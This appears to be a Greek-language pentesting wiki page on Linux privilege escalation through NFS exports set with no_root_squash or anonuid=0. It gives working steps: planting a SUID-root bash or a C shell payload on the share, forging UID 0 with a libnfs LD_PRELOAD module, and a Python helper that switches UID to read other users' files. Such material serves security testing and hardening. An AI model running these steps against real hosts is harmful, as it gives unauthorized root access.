# Κλιμάκωση προνομίων μέσω λανθασμένης ρύθμισης NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες για το squashing

Με το NFS AUTH_SYS/AUTH_UNIX, ο server βασίζει τους ελέγχους δικαιωμάτων αρχείων στα `uid` και `gid` που παρέχονται σε κάθε αίτημα RPC. Άλλοι τύποι ασφάλειας, όπως το Kerberos, χρησιμοποιούν διαφορετικά διαπιστευτήρια και ο server μπορεί να αντιστοιχίσει τα αριθμητικά διαπιστευτήρια πριν ελέγξει τα δικαιώματα.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Αντιστοιχίζει κάθε UID και GID στον ανώνυμο λογαριασμό, ο οποίος στο Linux είναι από προεπιλογή ο `nobody` (65534). Το `no_all_squash` είναι η προεπιλογή για αιτήματα που δεν προέρχονται από root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Αυτή είναι η προεπιλογή στο Linux και αντιστοιχίζει αιτήματα με UID/GID 0 (root) στον ανώνυμο λογαριασμό· τα υπόλοιπα UID και GID δεν υφίστανται squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Απενεργοποιεί το root squashing, ώστε τα αιτήματα με UID/GID 0 να μπορούν να αξιολογούνται ως root στον server.<sup>[[4]](#references)</sup>

Αν ένας επιτρεπόμενος client μπορεί να προσαρτήσει ένα εγγράψιμο export στο **`/etc/exports`** που έχει ρυθμιστεί με **`no_root_squash`**, τα αιτήματά του με UID/GID 0 μπορούν να γράψουν εκεί ως ο χρήστης root του server.<sup>[[4]](#references)</sup>

Το `root_squash` αντιστοιχίζει ξανά μόνο το UID/GID 0· με AUTH_SYS, το **μη μηδενικό αριθμητικό UID/GID** ενός επιτρεπόμενου client μπορεί και πάλι να αντιστοιχεί σε διαφορετικό λογαριασμό στον server. Επομένως, ένα εγγράψιμο export μπορεί να δημιουργήσει διαδρομή μεταξύ χρηστών ακόμη και με ενεργό root squashing, αν ο client μπορεί να δημιουργήσει ένα αρχείο με αυτήν την αριθμητική ταυτότητα και ο server επιτρέπει την πρόσβαση. Για μεταβίβαση μέσω SUID/SGID, επαληθεύστε επίσης τον τελικό ιδιοκτήτη του αρχείου, την πρόσβαση εκτέλεσης, την κατάσταση `nosuid` του mount στον server, τις ACL και το SELinux ή άλλες πολιτικές. Η διαδρομή του export, η επιλογή `rw` ή η αντιστοιχία αριθμών από μόνη της δεν αποδεικνύει ότι επιτρέπεται η πρόσβαση του client, ότι το export είναι ενεργό ή ότι οι δύο hosts χρησιμοποιούν την ίδια αποτελεσματική αντιστοίχιση ταυτοτήτων. Εξετάστε παθητικά το `/etc/exports` και τα τοπικά metadata· μην προσαρτήσετε νέο share και μην δημιουργήσετε δοκιμαστικό αρχείο κατά την απαρίθμηση.<sup>[[4]](#references)[[5]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με το **NFS**, δείτε:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Κλιμάκωση προνομίων

### Αντιστοίχιση ανώνυμου λογαριασμού ισοδύναμη με root

Μην ελέγχετε μόνο για `no_root_squash`. Με `root_squash,anonuid=0,anongid=0`, το αίτημα UID/GID 0 ενός client υφίσταται squash **ξανά σε root**. Με `all_squash,anonuid=0,anongid=0`, ακόμη και οι ταυτότητες client που δεν είναι root αντιστοιχίζονται σε root στον server. Σε ένα εγγράψιμο export `sec=sys`, οποιαδήποτε από τις δύο ρυθμίσεις μπορεί να παρέχει το primitive δημιουργίας αρχείου που ανήκει στον root και χρησιμοποιείται στην παρακάτω μεταβίβαση SUID· εξακολουθούν να ισχύουν οι περιορισμοί για τους επιτρεπόμενους clients και το mount του θύματος.<sup>[[4]](#references)</sup>

Στον server, χρησιμοποιήστε το `exportfs -v` για να εξετάσετε το ενεργό export και τις επιλογές για τον **αντίστοιχο client**, συμπεριλαμβανομένων των `rw`, `sec=`, της λειτουργίας squash και των `anonuid`/`anongid`. Εξετάστε επίσης το `/etc/exports.d/*.exports` κατά τον έλεγχο της διαμόρφωσης· το `/etc/exports` από μόνο του μπορεί να μην περιέχει όλες τις πληροφορίες.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Επιλογή 1 με χρήση bash:
- Σε έναν επιτρεπόμενο client, κάντε mount ένα εγγράψιμο export ως root, αντιγράψτε το **`/bin/bash`** σε αυτό, ορίστε το bit **SUID** και εκτελέστε το από ένα mount του θύματος που δεν χρησιμοποιεί `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Για να παραμείνει το ανεβασμένο αρχείο στην κατοχή του root, ο server πρέπει να διατηρεί το UID 0 του client με **`no_root_squash`** ή να αντιστοιχίζει το αίτημα στο UID 0 με **`anonuid=0`**. Διαφορετικά, είναι δυνατή η δημιουργία SUID binary για άλλον λογαριασμό μόνο αν ο client μπορεί να δημιουργήσει ή να έχει στην κατοχή του το αρχείο με το αριθμητικό UID/GID αυτού του λογαριασμού.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Επιλογή 2 με μεταγλωττισμένο κώδικα C:
- Κάντε mount τον κατάλογο από έναν επιτρεπόμενο client, αντιγράψτε ένα μεταγλωττισμένο payload που εκμεταλλεύεται τα δικαιώματα SUID, ορίστε το bit **SUID** και εκτελέστε το από το victim (δείτε μερικά [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Ισχύουν οι ίδιοι περιορισμοί όπως προηγουμένως

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Τοπικό Exploit

> [!TIP]
> Σημειώστε ότι αν μπορείτε να δημιουργήσετε ένα **tunnel από το μηχάνημά σας προς το μηχάνημα του θύματος, μπορείτε και πάλι να χρησιμοποιήσετε την Remote έκδοση για να εκμεταλλευτείτε αυτή την κλιμάκωση προνομίων μέσω tunnelling των απαιτούμενων ports**.\
> Το ακόλουθο τέχνασμα είναι χρήσιμο όταν το `/etc/exports` περιορίζει το export στη διεύθυνση IP του θύματος: ο remote client δεν μπορεί να το κάνει mount, αλλά η τοπική τεχνική μπορεί να λειτουργήσει μέσω του share που είναι ήδη προσαρτημένο στον επιτρεπόμενο host.<sup>[[2]](#references)</sup>\
> Για αυτή τη μέθοδο libnfs χωρίς προνόμια, το export στο **`/etc/exports`** πρέπει να χρησιμοποιεί το flag `insecure`, ώστε η διεργασία να μπορεί να χρησιμοποιήσει μη δεσμευμένη source port· το `secure` είναι η προεπιλογή, αν και μια διεργασία που μπορεί να δεσμεύσει reserved port δεν χρειάζεται αυτή την επιλογή.<sup>[[1]](#references)[[4]](#references)</sup>

### Βασικές πληροφορίες

Ένας client NFSv3 AUTH_UNIX συμπεριλαμβάνει το effective UID, το GID και τις ομάδες του σε κάθε κλήση, και ο server τα χρησιμοποιεί για τους ελέγχους δικαιωμάτων. Αυτή η τοπική τεχνική εκμεταλλεύεται αυτό το μοντέλο πλαστογραφώντας τα RPC credentials μέσω του [libnfs](https://github.com/sahlberg/libnfs)· το preload module του υποστηρίζει την παράκαμψη των UID/GID στο NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Μεταγλώττιση της βιβλιοθήκης

Το παράδειγμα του libnfs ενδέχεται να απαιτεί προσαρμογές για τον kernel του στόχου· το walkthrough που χρησιμοποιείται εδώ αναφέρει συγκεκριμένα ότι πρέπει να γίνει comment out στις κλήσεις συστήματος fallocate πριν από τη μεταγλώττιση του preload module.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Εκτέλεση του Exploit

Το παράδειγμα δημιουργεί ένα μικρό βοηθητικό πρόγραμμα C που εκκινεί ένα shell, έπειτα το τοποθετεί στο share και χρησιμοποιεί το `ld_nfs.so` με UID 0 στο πλαίσιο του NFS για να το κάνει SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Μεταγλώττιση του κώδικα του exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Τοποθετήστε το exploit στο share και τροποποιήστε τα δικαιώματά του πλαστογραφώντας το UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Εκτελέστε το exploit για να αποκτήσετε προνόμια root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell για διακριτική πρόσβαση σε αρχεία

Μόλις αποκτηθεί πρόσβαση root, αυτό το μοτίβο `nfsh.py` ορίζει το effective UID στο UID του αρχείου-στόχου πριν εκτελέσει μια εντολή, επιτρέποντας την πρόσβαση χωρίς αναδρομική αλλαγή ιδιοκτησίας.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Εκτελέστε ως:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Μια λιγότερο γνωστή μέθοδος privesc μέσω NFS](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Προδιαγραφή πρωτοκόλλου NFS έκδοσης 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
